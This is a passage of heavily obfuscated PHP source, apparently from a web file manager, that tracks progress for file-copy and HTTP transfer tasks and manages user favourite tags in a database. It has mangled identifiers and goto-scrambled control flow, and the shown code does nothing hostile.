$aôïΩıÿÂú[$Dà≠€ƒÑ´â[1101]] = LNG($Dà≠€ƒÑ´â[1102]); $aôïΩıÿÂú[$Dà≠€ƒÑ´â[1103]] = 0; $aôïΩıÿÂú[$Dà≠€ƒÑ´â[1104]] = 0; goto C∞”É“›‚®; Cí˜‹≤∂⁄Ü: $Dà≠€ƒÑ´â =& $_SERVER[∞„˜ƒÑºª]; $aôïΩıÿÂú =& $this->task; $this->sourceCopyFolder = !1; goto dÉﬂÖ¿Üì¬; cë££í≈úÎ: Hook::bind($Dà≠€ƒÑ´â[1095], array($this, $Dà≠€ƒÑ´â[1096])); Hook::bind($Dà≠€ƒÑ´â[1097], array($this, $Dà≠€ƒÑ´â[1098])); Hook::bind($Dà≠€ƒÑ´â[1099], array($this, $Dà≠€ƒÑ´â[1100])); goto büÿß≥ø◊ô; cÑÉµÛ£“ó: Hook::bind($Dà≠€ƒÑ´â[422], array($this, $Dà≠€ƒÑ´â[1093])); Hook::bind($Dà≠€ƒÑ´â[424], array($this, $Dà≠€ƒÑ´â[1094])); Hook::bind($Dà≠€ƒÑ´â[425], array($this, $Dà≠€ƒÑ´â[1094])); goto cë££í≈úÎ; c«à∑‘ôµ¿: if (!$aôïΩıÿÂú[$Dà≠€ƒÑ´â[973]]) { $aôïΩıÿÂú[$Dà≠€ƒÑ´â[973]] = LNG($Dà≠€ƒÑ´â[1107]); } goto EèëïΩœî; C∞”É“›‚®: $aôïΩıÿÂú[$Dà≠€ƒÑ´â[1064]] = $Dà≠€ƒÑ´â[33]; $aôïΩıÿÂú[$Dà≠€ƒÑ´â[1105]] = $Dà≠€ƒÑ´â[33]; $aôïΩıÿÂú[$Dà≠€ƒÑ´â[1106]] = 0; goto c«à∑‘ôµ¿; EèëïΩœî: } protected function endAfter() { $aî™’›Æ∫è =& $_SERVER[∞„˜ƒÑºª]; Hook::unbind($aî™’›Æ∫è[1088], array($this, $aî™’›Æ∫è[1089])); Hook::unbind($aî™’›Æ∫è[1090], array($this, $aî™’›Æ∫è[1091])); Hook::unbind($aî™’›Æ∫è[1095], array($this, $aî™’›Æ∫è[1096])); Hook::unbind($aî™’›Æ∫è[1097], array($this, $aî™’›Æ∫è[1098])); Hook::unbind($aî™’›Æ∫è[1099], array($this, $aî™’›Æ∫è[1100])); } public function updateAfter() { goto D∏ö∑ôªõ‚; eúﬁÃï°ıé: $a©ÙŸïàÒ∞ = 0; if ($EíÀÌûÇ∑[$DÓøÌ’¡Îï[1105]] == $DÓøÌ’¡Îï[770]) { $a©ÙŸïàÒ∞ = $EíÀÌûÇ∑[$DÓøÌ’¡Îï[1104]] * 0.5; } else { if ($EíÀÌûÇ∑[$DÓøÌ’¡Îï[1105]] == $DÓøÌ’¡Îï[134]) { $a©ÙŸïàÒ∞ = $EíÀÌûÇ∑[$DÓøÌ’¡Îï[1104]] * 0.5 + $EíÀÌûÇ∑[$DÓøÌ’¡Îï[1103]] * 0.5; } } $EíÀÌûÇ∑[$DÓøÌ’¡Îï[1067]] = ($EíÀÌûÇ∑[$DÓøÌ’¡Îï[1108]] + $a©ÙŸïàÒ∞) / $EíÀÌûÇ∑[$DÓøÌ’¡Îï[454]]; goto C¨Œ·ËäÊ¯; C¨Œ·ËäÊ¯: if ($EíÀÌûÇ∑[$DÓøÌ’¡Îï[1067]] > 0) { $BÕâá‹≠ÁÑ = timeFloat() - $EíÀÌûÇ∑[$DÓøÌ’¡Îï[1069]] - $EíÀÌûÇ∑[$DÓøÌ’¡Îï[1072]]; $EíÀÌûÇ∑[$DÓøÌ’¡Îï[1073]] = $BÕâá‹≠ÁÑ * (1 - $EíÀÌûÇ∑[$DÓøÌ’¡Îï[1067]]) / $EíÀÌûÇ∑[$DÓøÌ’¡Îï[1067]]; } goto fÒÜç‘ææÿ; D∏ö∑ôªõ‚: $DÓøÌ’¡Îï =& $_SERVER[∞„˜ƒÑºª]; $EíÀÌûÇ∑ =& $this->task; if (!$EíÀÌûÇ∑[$DÓøÌ’¡Îï[454]]) { return; } goto eúﬁÃï°ıé; fÒÜç‘ææÿ: } public function addPath($A“ ˜«‘ë√) { goto f÷õÃîçÚ⁄; f÷õÃîçÚ⁄: $FÈ≈ìì·◊§ =& $_SERVER[∞„˜ƒÑºª]; $B‚å“É˘ÀÇ =& $this->task; $CÜ˘Ω◊Ó∞¿ = IO::infoWithChildren($A“ ˜«‘ë√); goto c∞‚†Ñ’†å; Fü˘ÏåÂŸ: $B‚å“É˘ÀÇ[$FÈ≈ìì·◊§[454]] += $CÜ˘Ω◊Ó∞¿[$FÈ≈ìì·◊§[86]]; $this->update(); goto F†•◊ââ„Á; c∞‚†Ñ’†å: if (!$B‚å“É˘ÀÇ[$FÈ≈ìì·◊§[1109]]) { $B‚å“É˘ÀÇ[$FÈ≈ìì·◊§[1109]] = array(); } $B‚å“É˘ÀÇ[$FÈ≈ìì·◊§[1109]][] = array($FÈ≈ìì·◊§[387] => $CÜ˘Ω◊Ó∞¿[$FÈ≈ìì·◊§[28]], $FÈ≈ìì·◊§[84] => $CÜ˘Ω◊Ó∞¿[$FÈ≈ìì·◊§[84]], $FÈ≈ìì·◊§[755] => $CÜ˘Ω◊Ó∞¿[$FÈ≈ìì·◊§[755]] ? $CÜ˘Ω◊Ó∞¿[$FÈ≈ìì·◊§[755]] : $CÜ˘Ω◊Ó∞¿[$FÈ≈ìì·◊§[84]]); if ($CÜ˘Ω◊Ó∞¿[$FÈ≈ìì·◊§[29]] == $FÈ≈ìì·◊§[163]) { $B‚å“É˘ÀÇ[$FÈ≈ìì·◊§[1065]] += 1; } else { $B‚å“É˘ÀÇ[$FÈ≈ìì·◊§[1065]] += $CÜ˘Ω◊Ó∞¿[$FÈ≈ìì·◊§[89]][$FÈ≈ìì·◊§[87]]; } goto Fü˘ÏåÂŸ; F†•◊ââ„Á: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($dÕı‰Ç‹«Œ) { $b˜á–ì¬ù® =& $_SERVER[∞„˜ƒÑºª]; $D¡µ´§Ò´‹ =& $this->task; $D¡µ´§Ò´‹[$b˜á–ì¬ù®[1101]] = $dÕı‰Ç‹«Œ[$b˜á–ì¬ù®[28]]; $D¡µ´§Ò´‹[$b˜á–ì¬ù®[1064]] = $dÕı‰Ç‹«Œ[$b˜á–ì¬ù®[28]]; $this->update(); } public function copyFileStart($a∞©˜ÕˆÕ—, $a∂ΩÖÖ¬Öö, $A±—ÿç´∆—, $CëÉ—¢ùíÊ, $bÀÚâ˜üèé, $a©Úœ◊ÓÓ) { goto F“∞Ë…∑Éû; F“∞Ë…∑Éû: $FÕÑ∑ÖèÕ∂ =& $_SERVER[∞„˜ƒÑºª]; $cê≈∞äà≠ÿ = $bÀÚâ˜üèé; if ($cê≈∞äà≠ÿ == $GLOBALS[$FÕÑ∑ÖèÕ∂[1110]]) { $cê≈∞äà≠ÿ = $GLOBALS[$FÕÑ∑ÖèÕ∂[1111]]; } goto eèìæú¯Ô≥; eèìæú¯Ô≥: $GLOBALS[$FÕÑ∑ÖèÕ∂[1111]] = $bÀÚâ˜üèé; $GLOBALS[$FÕÑ∑ÖèÕ∂[1110]] = $a©Úœ◊ÓÓ; $aΩﬂÓﬁçªÇ =& $this->task; goto b®ª≤∏¿€Ã; d∞ôÔÉÑŒÌ: $this->update(); goto DÃ¶õ¶‡ÔÍ; b®ª≤∏¿€Ã: $aΩﬂÓﬁçªÇ[$FÕÑ∑ÖèÕ∂[1101]] = $cê≈∞äà≠ÿ; $aΩﬂÓﬁçªÇ[$FÕÑ∑ÖèÕ∂[1103]] = (int) $a∞©˜ÕˆÕ—->size($a∂ΩÖÖ¬Öö); $aΩﬂÓﬁçªÇ[$FÕÑ∑ÖèÕ∂[1104]] = 0; goto eﬁé§‚ﬁ∫ÿ; eﬁé§‚ﬁ∫ÿ: $aΩﬂÓﬁçªÇ[$FÕÑ∑ÖèÕ∂[1064]] = $FÕÑ∑ÖèÕ∂[33]; $aΩﬂÓﬁçªÇ[$FÕÑ∑ÖèÕ∂[1105]] = $FÕÑ∑ÖèÕ∂[33]; $aΩﬂÓﬁçªÇ[$FÕÑ∑ÖèÕ∂[1106]] = 0; goto d∞ôÔÉÑŒÌ; DÃ¶õ¶‡ÔÍ: } public function copyFileEnd($f¶ÏÖè≤ï√, $CªÓ‘Í˜”ò, $Fπ®ÉûŸ≥Ç, $CëáˆÁå£ﬂ, $bµúÖ√øº≥, $eŒÜ“º”©Û) { $D‹é˜∆ûè√ =& $_SERVER[∞„˜ƒÑºª]; $eœ›ı£∫ÂÖ =& $this->task; $eœ›ı£∫ÂÖ[$D‹é˜∆ûè√[1104]] = $eœ›ı£∫ÂÖ[$D‹é˜∆ûè√[1103]]; $eœ›ı£∫ÂÖ[$D‹é˜∆ûè√[1108]] += $eœ›ı£∫ÂÖ[$D‹é˜∆ûè√[1103]]; $eœ›ı£∫ÂÖ[$D‹é˜∆ûè√[1105]] = $D‹é˜∆ûè√[33]; $this->update(1); } public function updateFileEnd($b†ë∂÷ü¥, $A»≠Øî˜Î∑) { $AœÔÓÀáâÇ =& $_SERVER[∞„˜ƒÑºª]; $Bøü⁄ÜòˆÕ =& $this->task; $Bøü⁄ÜòˆÕ[$AœÔÓÀáâÇ[1101]] = $b†ë∂÷ü¥; $Bøü⁄ÜòˆÕ[$AœÔÓÀáâÇ[1103]] = $A»≠Øî˜Î∑; $Bøü⁄ÜòˆÕ[$AœÔÓÀáâÇ[1108]] += $A»≠Øî˜Î∑; $this->update(1); } public function curlProgress($eâÃ”æØÇ, $A∞ˆ‘˘áõÔ, $E◊Ì÷â‚◊, $b∆ò‘®¿ä†, $D±¡ÌÔÇŸƒ) { $bÏ¡®Ê’˘ß =& $_SERVER[∞„˜ƒÑºª]; $f˜û„æÈàÔ =& $this->task; if ($D±¡ÌÔÇŸƒ > 0) { $f˜û„æÈàÔ[$bÏ¡®Ê’˘ß[1064]] = $bÏ¡®Ê’˘ß[1112]; $f˜û„æÈàÔ[$bÏ¡®Ê’˘ß[1105]] = $bÏ¡®Ê’˘ß[134]; if ($f˜û„æÈàÔ[$bÏ¡®Ê’˘ß[1103]] == $b∆ò‘®¿ä† || $b∆ò‘®¿ä† > 1024 * 1024) { $f˜û„æÈàÔ[$bÏ¡®Ê’˘ß[1104]] = $D±¡ÌÔÇŸƒ; } if ($f˜û„æÈàÔ[$bÏ¡®Ê’˘ß[1106]]) { $f˜û„æÈàÔ[$bÏ¡®Ê’˘ß[1104]] = $D±¡ÌÔÇŸƒ + $f˜û„æÈàÔ[$bÏ¡®Ê’˘ß[1106]]; } } else { if ($E◊Ì÷â‚◊ > 0) { if ($f˜û„æÈàÔ[$bÏ¡®Ê’˘ß[1103]] == $A∞ˆ‘˘áõÔ) { $f˜û„æÈàÔ[$bÏ¡®Ê’˘ß[1104]] = $E◊Ì÷â‚◊; $f˜û„æÈàÔ[$bÏ¡®Ê’˘ß[1064]] = $bÏ¡®Ê’˘ß[1113]; $f˜û„æÈàÔ[$bÏ¡®Ê’˘ß[1105]] = $bÏ¡®Ê’˘ß[770]; } } } $this->update(); } public function curlProgressStart($eçŸˆçÑÇè) { } public function curlProgressEnd($cõÚîÔß‰Ê) { $C∂¡øÿºÛÀ =& $_SERVER[∞„˜ƒÑºª]; $D—õì›ÃÉ =& $this->task; $EÔÒ µ»∆… = curl_getinfo($cõÚîÔß‰Ê); $D„µœ«ó’æ = $EÔÒ µ»∆…[$C∂¡øÿºÛÀ[1114]]; if ($D—õì›ÃÉ[$C∂¡øÿºÛÀ[1105]] == $C∂¡øÿºÛÀ[134] && $D„µœ«ó’æ) { $D—õì›ÃÉ[$C∂¡øÿºÛÀ[1106]] += $D„µœ«ó’æ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $A¥‡À∑§ìË =& $_SERVER[∞„˜ƒÑºª]; $F±˜Ì⁄«æ‰ =& $this->task; Hook::bind($A¥‡À∑§ìË[1097], array($this, $A¥‡À∑§ìË[1115])); Hook::bind($A¥‡À∑§ìË[1095], array($this, $A¥‡À∑§ìË[1116])); Hook::bind($A¥‡À∑§ìË[1099], array($this, $A¥‡À∑§ìË[1117])); } protected function endAfter() { $cËÈÆËø–ø =& $_SERVER[∞„˜ƒÑºª]; Hook::unbind($cËÈÆËø–ø[1097], array($this, $cËÈÆËø–ø[1115])); } public function progressStart($F ºËéÓ”) { $dÁÍÏû¶±ï =& $_SERVER[∞„˜ƒÑºª]; $Dß’Ë¥»§› = curl_getinfo($F ºËéÓ”); self::log($dÁÍÏû¶±ï[1118] . $Dß’Ë¥»§›[$dÁÍÏû¶±ï[294]]); self::valueSet($this->task[$dÁÍÏû¶±ï[366]], $this->task); } public function progressEnd($BµÜÁÒìç ) { $a™øö’“ﬂó =& $_SERVER[∞„˜ƒÑºª]; self::log($a™øö’“ﬂó[1119] . $this->task[$a™øö’“ﬂó[366]]); $this->end(); } public function progress($d© äº∏™Í, $a—≈ó€†œ•, $A∞¨é…ó–˘, $D¨‡€ÿ–ãÃ, $c≈≠Û◊∂‚î) { $e÷—ıÑÌ¶ÿ =& $_SERVER[∞„˜ƒÑºª]; $e¯ﬁ‹‹ÀÍä =& $this->task; if ($c≈≠Û◊∂‚î > 0) { $e¯ﬁ‹‹ÀÍä[$e÷—ıÑÌ¶ÿ[1065]] = $e¯ﬁ‹‹ÀÍä[$e÷—ıÑÌ¶ÿ[1065]] == 0 ? $D¨‡€ÿ–ãÃ : $e¯ﬁ‹‹ÀÍä[$e÷—ıÑÌ¶ÿ[1065]]; $e¯ﬁ‹‹ÀÍä[$e÷—ıÑÌ¶ÿ[1066]] = $c≈≠Û◊∂‚î; } else { if ($A∞¨é…ó–˘ > 0) { $e¯ﬁ‹‹ÀÍä[$e÷—ıÑÌ¶ÿ[1065]] = $e¯ﬁ‹‹ÀÍä[$e÷—ıÑÌ¶ÿ[1065]] == 0 ? $a—≈ó€†œ• : $e¯ﬁ‹‹ÀÍä[$e÷—ıÑÌ¶ÿ[1065]]; $e¯ﬁ‹‹ÀÍä[$e÷—ıÑÌ¶ÿ[1066]] = $A∞¨é…ó–˘; } } $this->update(); self::log("\160\x72\157\x67\162\145\163\x73\x48\164\164\160\x3a\144\x6f\x77\x6e\72{$A∞¨é…ó–˘}\x2f{$a—≈ó€†œ•}\x3b\x20\x75\x70\154\157\x61\x64\x3a{$c≈≠Û◊∂‚î}\57{$D¨‡€ÿ–ãÃ}\73"); } } goto AÙäú‡›¨ı; EñøÈ¥ÙΩû: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($eÑœÿÇ≤êä) { $d±ªÊ˘ëŸä =& $_SERVER[∞„˜ƒÑºª]; return array($d±ªÊ˘ëŸä[1859] => array(USER_ID, $d±ªÊ˘ëŸä[1922])); } protected function listData() { $e±≈∫˜∆Ûï =& $_SERVER[∞„˜ƒÑºª]; $Fÿ®¡áªäù = array($e±≈∫˜∆Ûï[1054] => USER_ID, $e±≈∫˜∆Ûï[1861] => array($e±≈∫˜∆Ûï[1923], 0)); $eö∫†ﬂ≠Õ» = $e±≈∫˜∆Ûï[1924]; $C¥©ËñÖÖñ = $e±≈∫˜∆Ûï[1925]; $dÜ©Ú§©“à = $this->field($eö∫†ﬂ≠Õ»)->where($Fÿ®¡áªäù)->order($C¥©ËñÖÖñ)->select(); return $dÜ©Ú§©“à ? $dÜ©Ú§©“à : array(); } protected function listByTag($C®ô•àí¶¿) { } protected function addToTag($B™âÌæàœè, $A¬˜ÍÁ∆óâ) { $FËº ‹≠º =& $_SERVER[∞„˜ƒÑºª]; if (!Model($FËº ‹≠º[1703])->listData($A¬˜ÍÁ∆óâ) || !Model($FËº ‹≠º[520])->pathInfo($B™âÌæàœè)) { return !1; } $AÇìÏãÌœ† = array($FËº ‹≠º[1054] => USER_ID, $FËº ‹≠º[1861] => $A¬˜ÍÁ∆óâ, $FËº ‹≠º[1577] => $B™âÌæàœè, $FËº ‹≠º[792] => $FËº ‹≠º[954], $FËº ‹≠º[387] => $FËº ‹≠º[33], $FËº ‹≠º[1520] => 0); if ($this->where($AÇìÏãÌœ†)->find()) { return !1; } return $this->add($AÇìÏãÌœ†); } protected function removeFromTag($f®∏◊éÑã·, $A¥≤ÃŸò«Õ) { $c”àè‘´‰ù =& $_SERVER[∞„˜ƒÑºª]; if (!Model($c”àè‘´‰ù[1703])->listData($A¥≤ÃŸò«Õ) || !Model($c”àè‘´‰ù[520])->pathInfo($f®∏◊éÑã·)) { return !1; } $cßÍáêÖì = array($c”àè‘´‰ù[1054] => USER_ID, $c”àè‘´‰ù[1861] => $A¥≤ÃŸò«Õ, $c”àè‘´‰ù[792] => $c”àè‘´‰ù[954], $c”àè‘´‰ù[1577] => $f®∏◊éÑã·); return $this->where($cßÍáêÖì)->delete(); } protected function removeByTag($Bïùº¯ã»ú) { $bºœ∏πµâ˘ =& $_SERVER[∞„˜ƒÑºª]; if (!$Bïùº¯ã»ú) { return !1; } $bΩΩ¥‹ÔÖ‹ = array($bºœ∏πµâ˘[1054] => USER_ID, $bºœ∏πµâ˘[1861] => $Bïùº¯ã»ú); return $this->where($bΩΩ¥‹ÔÖ‹)->delete(); } protected function removeBySource($CéÖ†∏≥ÛÕ) { $fäÙ—Ω∂—∑ =& $_SERVER[∞„˜ƒÑºª]; $e∆¯™‰Ü…‚ = array($fäÙ—Ω∂—∑[1054] => USER_ID, $fäÙ—Ω∂—∑[1577] => $CéÖ†∏≥ÛÕ, $fäÙ—Ω∂—∑[1861] => array($fäÙ—Ω∂—∑[688], 0)); return $this->where($e∆¯™‰Ü…‚)->delete(); } }